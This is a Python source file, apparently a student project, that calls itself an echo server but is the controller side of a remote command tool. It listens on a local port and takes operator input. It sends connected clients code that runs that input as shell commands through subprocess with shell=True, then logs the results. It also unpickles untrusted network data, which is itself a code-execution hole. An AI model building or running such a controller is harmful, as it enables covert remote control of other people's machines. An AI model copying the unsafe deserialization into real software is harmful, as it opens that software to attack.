# By Colby & Co. For SWE Senior Project. Do not commit crime.
# echo-server.py

import socket
import pickle
from abc import ABC, abstractmethod

ui_image = """888b     d888                   888    d8b              888b     d888                                         888               888          
8888b   d8888                   888    Y8P              8888b   d8888                                         888               888          
88888b.d88888                   888                     88888b.d88888                                         888               888          
888Y88888P888 888  888 .d8888b  888888 888  .d8888b     888Y88888P888  8888b.  888d888 88888b.d88b.   8888b.  888  8888b.   .d88888  .d88b.  
888 Y888P 888 888  888 88K      888    888 d88P"        888 Y888P 888     "88b 888P"   888 "888 "88b     "88b 888     "88b d88" 888 d8P  Y8b 
888  Y8P  888 888  888 "Y8888b. 888    888 888          888  Y8P  888 .d888888 888     888  888  888 .d888888 888 .d888888 888  888 88888888 
888   "   888 Y88b 888      X88 Y88b.  888 Y88b.        888   "   888 888  888 888     888  888  888 888  888 888 888  888 Y88b 888 Y8b.     
888       888  "Y88888  88888P'  "Y888 888  "Y8888P     888       888 "Y888888 888     888  888  888 "Y888888 888 "Y888888  "Y88888  "Y8888  
                   888                                                                                                                       
              Y8b d88P                                                                                                                       
               "Y88P"    """

pickleCommand1 = """result = subprocess.run('"""

pickleCommand2 = """', stdout=subprocess.PIPE, text=True, shell=True)
newValue = result.stdout
reSerialized = pickle.dumps(newValue)
s.sendall(reSerialized)"""

def pickleMainTesting():
    HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
    PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
    log = open("MysticMarmalade.txt", "a")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            with conn:
                userCommand = input(">> ")
                log.write(">> "+userCommand+"\n")
                if userCommand == "quit":
                    data = pickle.dumps("quit")
                else:
                    data = pickle.dumps(pickleCommand1 + userCommand + pickleCommand2)
                conn.sendall(data)
                if userCommand == "quit":
                    break
                recieved = conn.recv(1024000)
                deSerialized = pickle.loads(recieved)
                log.write("<< "+deSerialized+"\n")
                #if not recieved:
                print(deSerialized)
    log.close()


__name__ = "__main__"

if __name__ == "__main__":
    print(ui_image)
    print("type 'quit' to terminate connection")
    pickleMainTesting()